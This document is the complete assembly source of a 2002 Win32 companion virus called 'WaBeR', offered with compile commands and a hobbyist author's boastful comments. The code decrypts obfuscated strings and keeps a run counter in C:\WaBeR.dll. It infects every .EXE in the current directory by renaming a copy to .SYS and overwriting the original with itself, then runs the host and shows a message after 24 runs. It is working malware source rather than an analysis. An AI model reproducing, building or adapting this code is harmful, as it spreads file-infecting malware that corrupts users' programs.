;===========================================================================================
;			      ...:: Win32.WaBeR - ViruS ::...
;			      		Version 2.4
;				      by -DiA- (c) 02
;					  GermanY
;
;
;
; Here it is! My 1st Win32.Companion Virus ...success!!! :)
; Don't grumble about the code, it's my 2th Win32.Virus...   ...and I go on. =)
;   DiA_hates_machine@gmx.de
;
;
;
; Some Comments:
; -decrypt the strings
; -read the counter >not exist = MAKE IT!
;		    >if not 0  = go to the virus and infect some files
;		    >if 0      = jmp to PAYLOAD
; -payload:
;   +after 24 starts the payload aktivate
;   +it prints a nice message:
;				...:Weed And BEer Rulez:...
;				Win32.WaBeR - ViruS
;				Version 2.4
;				by -DiA- (c)02
;				[PLEASE RESET THE WaBeR-COUNTER : "C:\WaBeR.dll"]
; -virus renames found .EXE to .SYS file
; -virus copy itself to the .EXE file
; -after work the host runs!
; -allright...
;
;
; Greetz to Monochrom - without you, this virus can't live :)
;
;
; To Compile the WaBeR - ViruS:
; tasm32 /z /ml /m3 WaBeR24,,;
; tlink32 -Tpe -c WaBeR24,WaBeR24,, import32.lib
;
; To Compile the WaBeR - SYS:
; tasm32 /z /ml /m3 WaBeR24sys,,;
; tlink32 -Tpe -c WaBeR24sys,WaBeR24sys,, import32.lib
; rename WaBeR24sys.exe WaBeR24.sys
;===========================================================================================


;*******************************************************************************************
;*****cut*****WaBeR24.sys*******************************************************************
;.386
;.model flat
;jumps
;
;extrn MessageBoxA:PROC
;extrn ExitProcess:PROC
;
;.data
;titel db '1st Generation',0
;msg   db 'Win32.WaBeR - Virus',10,13
;      db 'Version 2.4',10,13
;      db 'by -DiA- (c)02',10,13
;      db '[my 1st companion virus in win32]',0
;
;.code
;start:
;
;push 16
;push offset titel
;push offset msg
;push 0
;call MessageBoxA
;
;push 0
;call ExitProcess
;
;end start
;*****cut*****WaBeR24.sys*******************************************************************
;*******************************************************************************************


;=====Have Fun...===========================================================================
.386
.model flat
jumps

extrn GetCommandLineA:PROC
extrn lstrcpyA:PROC
extrn FindFirstFileA:PROC
extrn CopyFileA:PROC
extrn FindNextFileA:PROC
extrn CreateProcessA:PROC
extrn ExitProcess:PROC
extrn MessageBoxA:PROC
extrn OpenFile:PROC
extrn CreateFileA:PROC
extrn WriteFile:PROC
extrn ReadFile:PROC
extrn CloseHandle:PROC
extrn SetFilePointer:PROC

.data
FileName	db '˘ÄÊÌ€¯ﬂËîﬁ÷÷',-70
titel		db 'îîîÄÌﬂﬂﬁö˚‘ﬁö¯ˇﬂ»öËœ÷ﬂ¿Äîîî',-70
msg		db 'Ì”‘âàîÌ€¯ﬂËöóöÏ”»œÈ',-80,-73
		db 'Ïﬂ»…”’‘öàîé',-80,-73
		db 'ÿ√öó˛”˚óöíŸìäà',-80,-73,-80,-73,-80,-73
		db '·Íˆˇ˚ÈˇöËˇÈˇÓöÓÚˇöÌ€¯ﬂËó˘ıÔÙÓˇËöÄöò˘ÄÊÌ€¯ﬂËîﬁ÷÷òÁ',-70
FirstNum	db 'Ú',-70
FileMask	db 'êîˇ‚ˇ',-70
Number		db 01d dup (0)
FileAttr	dd 0
FileHandle	dd 0
Read		dd 0
Write		dd 0
FindHandle	dd 0
ProcessInfo	dd 4 dup (0)
StartupInfo	dd 4 dup (0)
Win32FindData	dd 0,0,0,0,0,0,0,0,0,0,0
FindFile	db 200 dup (0)
CreateFile	db 200 dup (0)
VirusFile	db 200 dup (0)
OriginFile	db 200 dup (0)


.code
start:

;-----Decrypt all Strings-------------------------------------------------------------------
mov esi,offset FileName
mov edi,esi
mov ecx,154d
call DeCrypt
;-------------------------------------------------------------------------------------------

;-----Check the Counter---------------------------------------------------------------------
push 2
push offset FileAttr
push offset FileName
call OpenFile

cmp eax,0FFFFFFFFh
je MakeFile

mov dword ptr [FileHandle],eax

GOon:
call SetPointer

push 0
push offset Read
push 01d
push offset Number
push dword ptr [FileHandle]
call ReadFile

cmp byte ptr [Number],'0'
je BOOM

dec byte ptr [Number]

call SetPointer

push 0
push offset Write
push 01d
push offset Number
push dword ptr [FileHandle]
call WriteFile

push dword ptr [FileHandle]
call CloseHandle
jmp WaBeR

MakeFile:
push 0
push 80h
push 2
push 0
push 0
push 0C0000000h
push offset FileName
call CreateFileA

mov dword ptr [FileHandle],eax

call SetPointer

push 0
push offset Write
push 01d
push offset FirstNum
push dword ptr [FileHandle]
call WriteFile

jmp GOon

BOOM:
push dword ptr [FileHandle]
call CloseHandle

push 16
push offset titel
push offset msg
push 0
call MessageBoxA
jmp exit

SetPointer:
push 0
push 0
push 0
push dword ptr [FileHandle]
call SetFilePointer
ret
;-------------------------------------------------------------------------------------------

;-----Decrypt Loop--------------------------------------------------------------------------
DeCrypt:
lodsb
xor al,69d
not al
stosb
loop DeCrypt
ret
;-------------------------------------------------------------------------------------------

;-----Infect some Filez---------------------------------------------------------------------
WaBeR:

call GetCommandLineA

push eax
push offset VirusFile
call lstrcpyA

mov eax,offset VirusFile
GetPoint1:
cmp byte ptr [eax],'.'
jz FoundPoint1
inc eax
jmp GetPoint1

FoundPoint1:
add eax,04d
mov byte ptr [eax],00

push offset VirusFile+1
push offset OriginFile
call lstrcpyA

mov eax,offset OriginFile
GetPoint2:
cmp byte ptr [eax],'.'
jz FoundPoint2
inc eax
jmp GetPoint2

FoundPoint2:
inc eax
mov dword ptr [eax],535953h

push offset Win32FindData
push offset FileMask
call FindFirstFileA
mov dword ptr [FindHandle],eax

FindNext:
cmp eax,-1
je RunHost
or eax,eax
jz RunHost

push offset FindFile
push offset CreateFile
call lstrcpyA

mov eax,offset CreateFile
GetPoint3:
cmp byte ptr [eax],'.'
jz FoundPoint3
inc eax
jmp GetPoint3

FoundPoint3:
inc eax
mov dword ptr [eax],535953h

push 1
push offset CreateFile
push offset FindFile
call CopyFileA

push 0
push offset FindFile
push offset VirusFile+1
call CopyFileA

push offset Win32FindData
push dword ptr [FindHandle]
call FindNextFileA
jmp FindNext

RunHost:
push offset ProcessInfo
push offset StartupInfo
push 0
push 0
push 00000010h
push 0
push 0
push 0
push offset OriginFile
push offset OriginFile
call CreateProcessA

exit:
push 0
call ExitProcess
;-W-E-E-D--A-N-D--B-E-E-R--R-U-L-E-Z-----DiA------------------------------------------------
end start
;===========================================================================================